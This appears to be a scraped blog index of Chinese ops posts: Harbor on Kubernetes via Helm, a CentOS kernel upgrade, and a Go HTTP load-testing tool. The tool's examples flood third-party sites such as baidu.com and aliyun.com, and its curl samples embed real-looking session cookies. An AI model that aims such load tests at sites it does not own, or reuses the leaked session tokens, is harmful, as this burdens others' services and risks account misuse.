secret key，必须是一个16位的字符串 secretKey: \u0026quot;not-a-secure-key\u0026quot; # The proxy settings for updating clair vulnerabilities from the Internet and replicating # artifacts from/to the registries that cannot be reached directly proxy: httpProxy: httpsProxy: noProxy: 127.0.0.1,localhost,.local,.internal components: - core - jobservice - clair - trivy # The custom ca bundle secret, the secret must contain key named \u0026quot;ca.crt\u0026quot; # which will be injected into the trust store for chartmuseum, clair, core, jobservice, registry, trivy components # caBundleSecretName: \u0026quot;\u0026quot; ## UAA Authentication Options # If you're using UAA for authentication behind a self-signed # certificate you will need to provide the CA Cert. # Set uaaSecretName below to provide a pre-created secret that # contains a base64 encoded CA Certificate named `ca.crt`. # uaaSecretName: # 如果你通过\u0026quot;ingress\u0026quot;保留服务，则下面的Nginx不会被使用 nginx: image: repository: goharbor/nginx-photon tag: v2.0.2 # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; replicas: 1 # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} portal: image: repository: goharbor/harbor-portal tag: v2.0.2 # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; replicas: 1 # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} core: image: repository: goharbor/harbor-core tag: v2.0.2 # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; replicas: 1 ## Liveness probe values livenessProbe: initialDelaySeconds: 300 # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} # Secret is used when core server communicates with other components. # If a secret key is not specified, Helm will generate one. # Must be a string of 16 chars. secret: \u0026quot;\u0026quot; # Fill the name of a kubernetes secret if you want to use your own # TLS certificate and private key for token encryption/decryption. # The secret must contain keys named: # \u0026quot;tls.crt\u0026quot; - the certificate # \u0026quot;tls.key\u0026quot; - the private key # The default key pair will be used if it isn't set secretName: \u0026quot;\u0026quot; # The XSRF key. Will be generated automatically if it isn't specified xsrfKey: \u0026quot;\u0026quot; jobservice: image: repository: goharbor/harbor-jobservice tag: v2.0.2 replicas: 1 # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; maxJobWorkers: 10 # The logger for jobs: \u0026quot;file\u0026quot;, \u0026quot;database\u0026quot; or \u0026quot;stdout\u0026quot; jobLogger: file # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} # Secret is used when job service communicates with other components. # If a secret key is not specified, Helm will generate one. # Must be a string of 16 chars. secret: \u0026quot;\u0026quot; registry: # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; registry: image: repository: goharbor/registry-photon tag: v2.0.2 # resources: # requests: # memory: 256Mi # cpu: 100m controller: image: repository: goharbor/harbor-registryctl tag: v2.0.2 # resources: # requests: # memory: 256Mi # cpu: 100m # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; replicas: 1 nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} # Secret is used to secure the upload state from client # and registry storage backend. # See: https://github.com/docker/distribution/blob/master/docs/configuration.md#http # If a secret key is not specified, Helm will generate one. # Must be a string of 16 chars. secret: \u0026quot;\u0026quot; # If true, the registry returns relative URLs in Location headers. The client is responsible for resolving the correct URL. relativeurls: false credentials: username: \u0026quot;harbor_registry_user\u0026quot; password: \u0026quot;harbor_registry_password\u0026quot; # If you update the username or password of registry, make sure use cli tool htpasswd to generate the bcrypt hash # e.g. \u0026quot;htpasswd -nbBC10 $username $password\u0026quot; htpasswd: \u0026quot;harbor_registry_user:$2y$10$9L4Tc0DJbFFMB6RdSCunrOpTHdwhid4ktBJmLD00bYgqkkGOvll3m\u0026quot; middleware: enabled: false type: cloudFront cloudFront: baseurl: example.cloudfront.net keypairid: KEYPAIRID duration: 3000s ipfilteredby: none # The secret key that should be present is CLOUDFRONT_KEY_DATA, which should be the encoded private key # that allows access to CloudFront privateKeySecret: \u0026quot;my-secret\u0026quot; chartmuseum: enabled: true # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; # Harbor defaults ChartMuseum to returning relative urls, if you want using absolute url you should enable it by change the following value to 'true' absoluteUrl: false image: repository: goharbor/chartmuseum-photon tag: v2.0.2 replicas: 1 # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} clair: enabled: true # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; clair: image: repository: goharbor/clair-photon tag: v2.0.2 # resources: # requests: # memory: 256Mi # cpu: 100m adapter: image: repository: goharbor/clair-adapter-photon tag: v2.0.2 # resources: # requests: # memory: 256Mi # cpu: 100m replicas: 1 # The interval of clair updaters, the unit is hour, set to 0 to # disable the updaters updatersInterval: 12 nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} trivy: # enabled the flag to enable Trivy scanner enabled: true image: # repository the repository for Trivy adapter image repository: goharbor/trivy-adapter-photon # tag the tag for Trivy adapter image tag: v2.0.2 # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; # replicas the number of Pod replicas replicas: 1 # debugMode the flag to enable Trivy debug mode with more verbose scanning log debugMode: false # vulnType a comma-separated list of vulnerability types. Possible values are `os` and `library`. vulnType: \u0026quot;os,library\u0026quot; # severity a comma-separated list of severities to be checked severity: \u0026quot;UNKNOWN,LOW,MEDIUM,HIGH,CRITICAL\u0026quot; # ignoreUnfixed the flag to display only fixed vulnerabilities ignoreUnfixed: false # insecure the flag to skip verifying registry certificate insecure: false # gitHubToken the GitHub access token to download Trivy DB # # Trivy DB contains vulnerability information from NVD, Red Hat, and many other upstream vulnerability databases. # It is downloaded by Trivy from the GitHub release page https://github.com/aquasecurity/trivy-db/releases and cached # in the local file system (`/home/scanner/.cache/trivy/db/trivy.db`). In addition, the database contains the update # timestamp so Trivy can detect whether it should download a newer version from the Internet or use the cached one. # Currently, the database is updated every 12 hours and published as a new release to GitHub. # # Anonymous downloads from GitHub are subject to the limit of 60 requests per hour. Normally such rate limit is enough # for production operations. If, for any reason, it's not enough, you could increase the rate limit to 5000 # requests per hour by specifying the GitHub access token. For more details on GitHub rate limiting please consult # https://developer.github.com/v3/#rate-limiting # # You can create a GitHub token by following the instructions in # https://help.github.com/en/github/authenticating-to-github/creating-a-personal-access-token-for-the-command-line gitHubToken: \u0026quot;\u0026quot; # skipUpdate the flag to disable Trivy DB downloads from GitHub # # You might want to set the value of this flag to `true` in test or CI/CD environments to avoid GitHub rate limiting issues. # If the value is set to `true` you have to manually download the `trivy.db` file and mount it in the # `/home/scanner/.cache/trivy/db/trivy.db` path. skipUpdate: false resources: requests: cpu: 200m memory: 512Mi limits: cpu: 1 memory: 1Gi ## Additional deployment annotations podAnnotations: {} notary: enabled: true server: # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; image: repository: goharbor/notary-server-photon tag: v2.0.2 replicas: 1 # resources: # requests: # memory: 256Mi # cpu: 100m signer: # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; image: repository: goharbor/notary-signer-photon tag: v2.0.2 replicas: 1 # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} ## Additional deployment annotations podAnnotations: {} # Fill the name of a kubernetes secret if you want to use your own # TLS certificate authority, certificate and private key for notary # communications. # The secret must contain keys named ca.crt, tls.crt and tls.key that # contain the CA, certificate and private key. # They will be generated if not set. secretName: \u0026quot;\u0026quot; database: # if external database is used, set \u0026quot;type\u0026quot; to \u0026quot;external\u0026quot; # and fill the connection informations in \u0026quot;external\u0026quot; section type: internal internal: # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; image: repository: goharbor/harbor-db tag: v2.0.2 # The initial superuser password for internal database password: \u0026quot;changeit\u0026quot; # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} external: host: \u0026quot;192.168.0.1\u0026quot; port: \u0026quot;5432\u0026quot; username: \u0026quot;user\u0026quot; password: \u0026quot;password\u0026quot; coreDatabase: \u0026quot;registry\u0026quot; clairDatabase: \u0026quot;clair\u0026quot; notaryServerDatabase: \u0026quot;notary_server\u0026quot; notarySignerDatabase: \u0026quot;notary_signer\u0026quot; # \u0026quot;disable\u0026quot; - No SSL # \u0026quot;require\u0026quot; - Always SSL (skip verification) # \u0026quot;verify-ca\u0026quot; - Always SSL (verify that the certificate presented by the # server was signed by a trusted CA) # \u0026quot;verify-full\u0026quot; - Always SSL (verify that the certification presented by the # server was signed by a trusted CA and the server host name matches the one # in the certificate) sslmode: \u0026quot;disable\u0026quot; # The maximum number of connections in the idle connection pool. # If it \u0026lt;=0, no idle connections are retained. maxIdleConns: 50 # The maximum number of open connections to the database. # If it \u0026lt;= 0, then there is no limit on the number of open connections. # Note: the default number of connections is 1024 for postgre of harbor. maxOpenConns: 1000 ## Additional deployment annotations podAnnotations: {} redis: # if external Redis is used, set \u0026quot;type\u0026quot; to \u0026quot;external\u0026quot; # and fill the connection informations in \u0026quot;external\u0026quot; section type: internal internal: # set the service account to be used, default if left empty serviceAccountName: \u0026quot;\u0026quot; image: repository: goharbor/redis-photon tag: v2.0.2 # resources: # requests: # memory: 256Mi # cpu: 100m nodeSelector: {} tolerations: [] affinity: {} external: host: \u0026quot;192.168.0.2\u0026quot; port: \u0026quot;6379\u0026quot; # The \u0026quot;coreDatabaseIndex\u0026quot; must be \u0026quot;0\u0026quot; as the library Harbor # used doesn't support configuring it coreDatabaseIndex: \u0026quot;0\u0026quot; jobserviceDatabaseIndex: \u0026quot;1\u0026quot; registryDatabaseIndex: \u0026quot;2\u0026quot; chartmuseumDatabaseIndex: \u0026quot;3\u0026quot; clairAdapterIndex: \u0026quot;4\u0026quot; trivyAdapterIndex: \u0026quot;5\u0026quot; password: \u0026quot;\u0026quot; ## Additional deployment annotations podAnnotations: {} 简化后harbor.yaml\nexpose: type: ingress tls: enabled: true secretName: \u0026quot;youpenglai\u0026quot; ingress: hosts: core: harbor.fenghong.tech notary: notary.fenghong.tech controller: default annotations: ingress.kubernetes.io/ssl-redirect: \u0026quot;true\u0026quot; ingress.kubernetes.io/proxy-body-size: \u0026quot;0\u0026quot; nginx.ingress.kubernetes.io/ssl-redirect: \u0026quot;true\u0026quot; nginx.ingress.kubernetes.io/proxy-body-size: \u0026quot;0\u0026quot; externalURL: https://harbor.fenghong.tech persistence: enabled: true resourcePolicy: \u0026quot;keep\u0026quot; persistentVolumeClaim: registry: storageClass: \u0026quot;nfs\u0026quot; accessMode: ReadWriteOnce size: 2Gi chartmuseum: storageClass: \u0026quot;nfs\u0026quot; accessMode: ReadWriteOnce size: 2Gi jobservice: existingClaim: \u0026quot;\u0026quot; storageClass: \u0026quot;nfs\u0026quot; subPath: \u0026quot;\u0026quot; accessMode: ReadWriteOnce size: 1Gi database: storageClass: \u0026quot;nfs\u0026quot; accessMode: ReadWriteOnce size: 1Gi redis: storageClass: \u0026quot;nfs\u0026quot; accessMode: ReadWriteOnce size: 1Gi trivy: storageClass: \u0026quot;nfs\u0026quot; accessMode: ReadWriteOnce size: 2Gi imagePullPolicy: IfNotPresent 部署 其中需要我们定制的部分很少，我们将域名替换成我们自己的，使用默认的 Ingress 方式暴露服务，其他需要我们手动配置的部分就是数据持久化的部分，我们需要提前为上面的这些服务创建好可用的 PVC 或者 StorageClass 对象，比如我们这里使用一个名为 harbor-data 的 StorageClass 资源对象，当然也可以根据我们实际的需求修改 accessMode 或者存储容量.这里,我已经预先创建了基于nfs的动态pvc了以及域名证书tls. 不熟悉的可以找一下之前的文章.\n$ kubectl create ns kube-ops # 使用指定的key创建名为fenghong的TLS secret $ kubectl create secret tls fenghong --cert=path/to/tls.cert --key=path/to/tls.key -n kube-ops # 创建nginx-ingress $ kubectl apply -f https://kuboard.cn/install-script/v1.18.x/nginx-ingress.yaml ## 指定values.yaml安装 harbor $ helm repo add harbor https://helm.goharbor.io $ helm install harbor harbor/harbor -f harbor.yaml --namespace kube-ops 查看部署结果 $ kubectl get all -n kube-ops NAME READY STATUS RESTARTS AGE pod/harbor-harbor-chartmuseum-9dbc86bf5-np6tm 1/1 Running 0 65m pod/harbor-harbor-clair-75c79f8699-hh9z8 2/2 Running 0 30m pod/harbor-harbor-core-c5f8b499d-n7jq5 1/1 Running 0 65m pod/harbor-harbor-database-0 1/1 Running 0 65m pod/harbor-harbor-jobservice-7bc6f94fc8-hrwqw 1/1 Running 1 65m pod/harbor-harbor-notary-server-5fc79f89d8-2mfvn 1/1 Running 2 65m pod/harbor-harbor-notary-signer-55fb874764-phg9c 1/1 Running 2 65m pod/harbor-harbor-portal-87858859c-z5gpm 1/1 Running 0 65m pod/harbor-harbor-redis-0 1/1 Running 0 65m pod/harbor-harbor-registry-7ddd894946-txmfr 2/2 Running 0 21m pod/harbor-harbor-trivy-0 1/1 Running 0 65m NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE service/harbor-harbor-chartmuseum ClusterIP 10.102.191.179 \u0026lt;none\u0026gt; 80/TCP 65m service/harbor-harbor-clair ClusterIP 10.97.102.76 \u0026lt;none\u0026gt; 8080/TCP 65m service/harbor-harbor-core ClusterIP 10.104.232.106 \u0026lt;none\u0026gt; 80/TCP 65m service/harbor-harbor-database ClusterIP 10.101.7.197 \u0026lt;none\u0026gt; 5432/TCP 65m service/harbor-harbor-jobservice ClusterIP 10.111.236.111 \u0026lt;none\u0026gt; 80/TCP 65m service/harbor-harbor-notary-server ClusterIP 10.99.122.140 \u0026lt;none\u0026gt; 4443/TCP 65m service/harbor-harbor-notary-signer ClusterIP 10.110.255.184 \u0026lt;none\u0026gt; 7899/TCP 65m service/harbor-harbor-portal ClusterIP 10.101.139.189 \u0026lt;none\u0026gt; 80/TCP 65m service/harbor-harbor-redis ClusterIP 10.105.216.126 \u0026lt;none\u0026gt; 6379/TCP 65m service/harbor-harbor-registry ClusterIP 10.98.71.16 \u0026lt;none\u0026gt; 5000/TCP,8080/TCP 65m service/harbor-harbor-trivy ClusterIP 10.104.97.54 \u0026lt;none\u0026gt; 8080/TCP 65m NAME READY UP-TO-DATE AVAILABLE AGE deployment.apps/harbor-harbor-chartmuseum 1/1 1 1 65m deployment.apps/harbor-harbor-clair 1/1 1 1 65m deployment.apps/harbor-harbor-core 1/1 1 1 65m deployment.apps/harbor-harbor-jobservice 1/1 1 1 65m deployment.apps/harbor-harbor-notary-server 1/1 1 1 65m deployment.apps/harbor-harbor-notary-signer 1/1 1 1 65m deployment.apps/harbor-harbor-portal 1/1 1 1 65m deployment.apps/harbor-harbor-registry 1/1 1 1 65m NAME DESIRED CURRENT READY AGE replicaset.apps/harbor-harbor-chartmuseum-9dbc86bf5 1 1 1 65m replicaset.apps/harbor-harbor-clair-75c79f8699 1 1 1 65m replicaset.apps/harbor-harbor-core-c5f8b499d 1 1 1 65m replicaset.apps/harbor-harbor-jobservice-7bc6f94fc8 1 1 1 65m replicaset.apps/harbor-harbor-notary-server-5fc79f89d8 1 1 1 65m replicaset.apps/harbor-harbor-notary-signer-55fb874764 1 1 1 65m replicaset.apps/harbor-harbor-portal-87858859c 1 1 1 65m replicaset.apps/harbor-harbor-registry-7ddd894946 1 1 1 65m NAME READY AGE statefulset.apps/harbor-harbor-database 1/1 65m statefulset.apps/harbor-harbor-redis 1/1 65m statefulset.apps/harbor-harbor-trivy 1/1 65m ## 查看ingress $ kubectl get ing -n kube-ops NAME CLASS HOSTS ADDRESS PORTS AGE harbor-harbor-ingress \u0026lt;none\u0026gt; harbor.fenghong.tech 80, 443 140m harbor-harbor-ingress-notary \u0026lt;none\u0026gt; notary.fenghong.tech 80, 443 140m 添加完成后，在浏览器中输入harbor.fenghong.tech 界面了，当然我们配置的 Ingress 中会强制跳转到 https，所以如果你的浏览器有什么安全限制的话，证书是阿里云的免费一年的帧数，证书文件可以通过查看 Secret 资源对象获取.\n然后输入用户名：admin，密码：Harbor12345（当然我们也可以通过 Helm 安装的时候自己覆盖 harborAdminPassword）即可登录进入 Portal 首页 .\n高可用参考官网.\n","permalink":"https://www.fenghong.tech/blog/kubernetes/kubernetes-harbor-nginx-ingress/","tags":["kubernetes","harbor"],"title":"kubernetes1.18.0部署harborv2.0.2"},{"categories":["ops"],"contents":"[TOC]\ncentos7.7内核升级 ## 载入公钥 $ rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org ## 安装 ELRepo 最新版本 $ yum install -y https://www.elrepo.org/elrepo-release-7.el7.elrepo.noarch.rpm ## 列出可以使用的 kernel 包版本 $ yum list available --disablerepo=* --enablerepo=elrepo-kernel ## 安装指定的 kernel 版本： $ yum install kernel-lt-4.4.237-1.el7.elrepo --enablerepo=elrepo-kernel -y ## 查看系统可用内核 $ cat /boot/grub2/grub.cfg | grep menuentry if [ x\u0026quot;${feature_menuentry_id}\u0026quot; = xy ]; then menuentry_id_option=\u0026quot;--id\u0026quot; menuentry_id_option=\u0026quot;\u0026quot; export menuentry_id_option menuentry 'CentOS Linux (4.4.237-1.el7.elrepo.x86_64) 7 (Core)' --class centos --class gnu-linux --class gnu --class os --unrestricted $menuentry_id_option 'gnulinux-3.10.0-1062.el7.x86_64-advanced-896f5ebd-5d23-45a7-8e1e-95cf74464a30' { menuentry 'CentOS Linux (3.10.0-1062.el7.x86_64) 7 (Core)' --class centos --class gnu-linux --class gnu --class os --unrestricted $menuentry_id_option 'gnulinux-3.10.0-1062.el7.x86_64-advanced-896f5ebd-5d23-45a7-8e1e-95cf74464a30' { ## 设置开机从新内核启动 $ grub2-set-default 'CentOS Linux (4.4.237-1.el7.elrepo.x86_64) 7 (Core)' ## 查看内核启动项 $ grub2-editenv list saved_entry=CentOS Linux (4.4.237-1.el7.elrepo.x86_64) 7 (Core) 重启\n$ reboot ","permalink":"https://www.fenghong.tech/blog/technology/kernel-update/","tags":["ops","kernel"],"title":"kernel update by yum"},{"categories":["kubernetes"],"contents":"[TOC]\nstress go 实现的压测工具，每个用户用一个协程的方式模拟，最大限度的利用 CPU 资源. 下载\n1.1 安装 使用make安装. 建议使用make安装.\n$ git clone https://github.com/oldthreefeng/stress $ make linux 使用golang build\n$ git clone https://github.com/oldthreefeng/stress $ go build -o stress main.go 使用脚本项目脚本构建 build.sh\n$ git clone https://github.com/oldthreefeng/stress $ sh build.sh v1.0.0 1.2 项目体验 参数说明:\n-c 表示并发数 默认为 1\n-n 每个并发执行请求的次数， 默认为 1 ，总请求的次数 = 并发数 * 每个并发执行请求的次数\n-u 需要压测的地址 example: http://www.baidu.com/\n# 运行 以linux为示例 ./stress -c 1 -n 100 -u https://www.baidu.com/ or use in docker ,高并发建议开启多docker。在性能差的机子上，运行效果不好。\n$ docker pull louisehong/stress docker run --rm louisehong/stress -c 10 -n 10 -u https://www.baidu.com/ 开始启动 并发数:10 请求数:10 请求参数: request: form:http url:https://www.baidu.com/ method:GET headers:map[] data: verify:statusCode timeout:30s debug:false ─────┬───────┬───────┬───────┬────────┬────────┬────────┬────────┬──────── 耗时│ 并发数│ 成功数│ 失败数│ qps │最长耗时│最短耗时│平均耗时│ 错误码 ─────┼───────┼───────┼───────┼────────┼────────┼────────┼────────┼──────── 1s│ 10│ 99│ 0│ 176.48│ 82.88│ 40.26│ 5.67│200:99 2s│ 10│ 100│ 0│ 149.89│ 1061.94│ 40.26│ 6.67│200:100 ************************* 结果 stat **************************** 处理协程数量: 10 请求总数（并发数*请求数 -c * -n）: 100 总请求时间: 1.557 秒 successNum: 100 failureNum: 0 ************************* 结果 end ****************************  压测结果展示  执行以后，终端每秒钟都会输出一次结果，压测完成以后输出执行的压测结果\n压测结果展示:\n ─────┬───────┬───────┬───────┬────────┬────────┬────────┬────────┬──────── 耗时│ 并发数 │ 成功数│ 失败数 │ qps │最长耗时 │最短耗时│平均耗时 │ 错误码 ─────┼───────┼───────┼───────┼────────┼────────┼────────┼────────┼──────── 1s│ 1│ 8│ 0│ 8.09│ 133.16│ 110.98│ 123.56│200:8 2s│ 1│ 15│ 0│ 8.02│ 138.74│ 110.98│ 124.61│200:15 3s│ 1│ 23│ 0│ 7.80│ 220.43│ 110.98│ 128.18│200:23 4s│ 1│ 31│ 0│ 7.83│ 220.43│ 110.23│ 127.67│200:31 5s│ 1│ 39│ 0│ 7.81│ 220.43│ 110.23│ 128.03│200:39 6s│ 1│ 46│ 0│ 7.72│ 220.43│ 110.23│ 129.59│200:46 7s│ 1│ 54│ 0│ 7.79│ 220.43│ 110.23│ 128.42│200:54 8s│ 1│ 62│ 0│ 7.81│ 220.43│ 110.23│ 128.09│200:62 9s│ 1│ 70│ 0│ 7.79│ 220.43│ 110.23│ 128.33│200:70 10s│ 1│ 78│ 0│ 7.82│ 220.43│ 106.47│ 127.85│200:78 11s│ 1│ 84│ 0│ 7.64│ 371.02│ 106.47│ 130.96│200:84 12s│ 1│ 91│ 0│ 7.63│ 371.02│ 106.47│ 131.02│200:91 13s│ 1│ 99│ 0│ 7.66│ 371.02│ 106.47│ 130.54│200:99 13s│ 1│ 100│ 0│ 7.66│ 371.02│ 106.47│ 130.52│200:100 ************************* 结果 stat **************************** 处理协程数量: 1 请求总数: 100 总请求时间: 13.055 秒 successNum: 100 failureNum: 0 ************************* 结果 end **************************** 参数解释:\n耗时: 程序运行耗时。程序每秒钟输出一次压测结果\n并发数: 并发数，启动的协程数\n成功数: 压测中，请求成功的数量\n失败数: 压测中，请求失败的数量\nqps: 当前压测的QPS(每秒钟处理请求数量)\n最长耗时: 压测中，单个请求最长的响应时长\n最短耗时: 压测中，单个请求最短的响应时长\n平均耗时: 压测中，单个请求平均的响应时长\n错误码: 压测中，接口返回的 code码:返回次数的集合\n2.1 压测是什么 压测，即压力测试，是确立系统稳定性的一种测试方法，通常在系统正常运作范围之外进行，以考察其功能极限和隐患。\n主要检测服务器的承受能力，包括用户承受能力（多少用户同时玩基本不影响质量）、流量承受等。\n 压测的目的就是通过压测(模拟真实用户的行为)，测算出机器的性能(单台机器的QPS)，从而推算出系统在承受指定用户数(100W)时，需要多少机器能支撑得住 压测是在上线前为了应对未来可能达到的用户数量的一次预估(提前演练)，压测以后通过优化程序的性能或准备充足的机器，来保证用户的体验。     压测类型 解释     压力测试(Stress Testing) 也称之为强度测试，测试一个系统的最大抗压能力，在强负载(大数据、高并发)的情况下，测试系统所能承受的最大压力，预估系统的瓶颈   并发测试(Concurrency Testing) 通过模拟很多用户同一时刻访问系统或对系统某一个功能进行操作，来测试系统的性能，从中发现问题(并发读写、线程控制、资源争抢)   耐久性测试(Configuration Testing) 通过对系统在大负荷的条件下长时间运行，测试系统、机器的长时间运行下的状况,从中发现问题(内存泄漏、数据库连接池不释放、资源不回收)    2.2 如何计算压测指标   压测我们需要有目的性的压测，这次压测我们需要达到什么目标(如:单台机器的性能为 100QPS?网站能同时满足100W人同时在线)\n  可以通过以下计算方法来进行计算:\n  压测原则:每天80%的访问量集中在20%的时间里，这20%的时间就叫做峰值\n  公式: ( 总PV数*80% ) / ( 每天的秒数*20% ) = 峰值时间每秒钟请求数(QPS)\n  机器: 峰值时间每秒钟请求数(QPS) / 单台机器的QPS = 需要的机器的数量\n  假设:网站每天的用户数(100W)，每天的用户的访问量约为3000W PV，这台机器的需要多少QPS?\n   ( 30000000*0.8 ) / (86400 * 0.2) ≈ 1389 (QPS)\n 3.1 用法 $ ./stress -h stress is a test cli for http and websocket stress written by golang, go 实现的压测工具，每个用户用一个协程的方式模拟，最大限度的利用 CPU 资源 Usage: stress [flags] stress [command] Examples: # stress curl file to test stress -f utils/curl.txt # stress curl file read from stdin cat utils/curl.txt | stress -f - # stress concurrency 10 \u0026amp; 10 times stress -c 10 -n 10 -f utils/curl.txt # stress cli url stress -c 10 -n 100 -u https://www.baidu.com Available Commands: help Help about any command version stress version Flags: -c, --concurrency uint 并发数 (default 1) --config string config file for stress (default is $HOME/.stress.yaml) --data string http post data -d, --debug debug 模式 -H, --header strings http post data -h, --help help for stress -n, --number uint 单协程的请求数 (default 1) -f, --path string read curl file to build test -u, --requestUrl string curl文件路径 -t, --toggle Help message for toggle -v, --verify string verify 验证方法 在server/verify中 http 支持:statusCode、json webSocket支持:json (default \u0026#34;statusCode\u0026#34;) Use \u0026#34;stress [command] --help\u0026#34; for more information about a command.  使用 curl文件进行压测  curl是Linux在命令行下的工作的文件传输工具，是一款很强大的http命令行工具。\n使用curl文件可以压测使用非GET的请求，支持设置http请求的 method、cookies、header、body等参数\nI: chrome 浏览器生成 curl文件，打开开发者模式(快捷键F12)，如图所示，生成 curl 在终端执行命令 II: postman 生成 curl 命令 生成内容粘贴到项目目录下的utils/curl.txt文件中，执行下面命令就可以从curl.txt文件中读取需要压测的内容进行压测了\n 支持多步压力测试  目前使用的方法是按行来分割每个请求.\n$ cat utils/curl.txt curl \u0026#39;https://mall.youpenglai.com/apis/version\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0\u0026#39; -H \u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#39; -H \u0026#39;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\u0026#39; --compressed -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H \u0026#39;Cache-Control: max-age=0\u0026#39; -H \u0026#39;TE: Trailers\u0026#39; curl \u0026#39;https://www.youpenglai.com/v2/sys/server\u0026#39; -H \u0026#39;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0\u0026#39; -H \u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#39; -H \u0026#39;Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3\u0026#39; --compressed -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Cookie: _ga=GA1.2.462595907.1596072242; Hm_lvt_16789552d8e4ee2108c29cc8197bfe19=1596077258; _gid=GA1.2.1014297080.1596441772; JSESSIONID=88EE56D0223D34DD83EB301962B121D1\u0026#39; -H \u0026#39;Upgrade-Insecure-Requests: 1\u0026#39; -H \u0026#39;Cache-Control: max-age=0\u0026#39; 支持从stdin读取curl请求. 从stdin读取的内容会保存在/tmp/curl.tmp\n$ cat utils/curl.txt | ./stress -f - 命令行示例.\n$ ./stress -c 1 -n 1 -d -u \u0026#39;https://page.aliyun.com/delivery/plan/list\u0026#39; \\  -H \u0026#39;authority: page.aliyun.com\u0026#39; \\  -H \u0026#39;accept: application/json, text/plain, */*\u0026#39; \\  -H \u0026#39;content-type: application/x-www-form-urlencoded\u0026#39; \\  -H \u0026#39;origin: https://cn.aliyun.com\u0026#39; \\  -H \u0026#39;sec-fetch-site: same-site\u0026#39; \\  -H \u0026#39;sec-fetch-mode: cors\u0026#39; \\  -H \u0026#39;sec-fetch-dest: empty\u0026#39; \\  -H \u0026#39;referer: https://cn.aliyun.com/\u0026#39; \\  -H \u0026#39;accept-language: zh-CN,zh;q=0.9\u0026#39; \\  -H \u0026#39;cookie: aliyun_choice=CN; JSESSIONID=J8866281-CKCFJ4BUZ7GDO9V89YBW1-KJ3J5V9K-GYUW7; maliyun_temporary_console0=1AbLByOMHeZe3G41KYd5WWZvrM%2BGErkaLcWfBbgveKA9ifboArprPASvFUUfhwHtt44qsDwVqMk8Wkdr1F5LccYk2mPCZJiXb0q%2Bllj5u3SQGQurtyPqnG489y%2FkoA%2FEvOwsXJTvXTFQPK%2BGJD4FJg%3D%3D; cna=L3Q5F8cHDGgCAXL3r8fEZtdU; isg=BFNThsmSCcgX-sUcc5Jo2s2T4tF9COfKYi8g9wVwr3KphHMmjdh3GrHFvPTqJD_C; l=eBaceXLnQGBjstRJBOfwPurza77OSIRAguPzaNbMiT5POw1B5WAlWZbqyNY6C3GVh6lwR37EODnaBeYBc3K-nxvOu9eFfGMmn\u0026#39; \\  --data \u0026#39;adPlanQueryParam=%7B%22adZone%22%3A%7B%22positionList%22%3A%5B%7B%22positionId%22%3A83%7D%5D%7D%2C%22requestId%22%3A%2217958651-f205-44c7-ad5d-f8af92a6217a%22%7D\u0026#39; \\  --compressed like curl cmd , use --data-raw is the same with --data, when use --compressed, only support command line and gzip. for curl file. the Header is in it. use --compressed, just do this req.Header.Add(\u0026quot;Accept-Encoding\u0026quot;, \u0026quot;gzip\u0026quot;).\n$ ./stress -c 1 -n 1 -d -u \u0026#39;https://page.aliyun.com/delivery/plan/list\u0026#39; \\  -H \u0026#39;authority: page.aliyun.com\u0026#39; \\  -H \u0026#39;accept: application/json, text/plain, */*\u0026#39; \\  -H \u0026#39;content-type: application/x-www-form-urlencoded\u0026#39; \\  -H \u0026#39;origin: https://cn.aliyun.com\u0026#39; \\  -H \u0026#39;sec-fetch-site: same-site\u0026#39; \\  -H \u0026#39;sec-fetch-mode: cors\u0026#39; \\  -H \u0026#39;sec-fetch-dest: empty\u0026#39; \\  -H \u0026#39;referer: https://cn.aliyun.com/\u0026#39; \\  -H \u0026#39;accept-language: zh-CN,zh;q=0.9\u0026#39; \\  -H \u0026#39;cookie: aliyun_choice=CN; JSESSIONID=J8866281-CKCFJ4BUZ7GDO9V89YBW1-KJ3J5V9K-GYUW7; 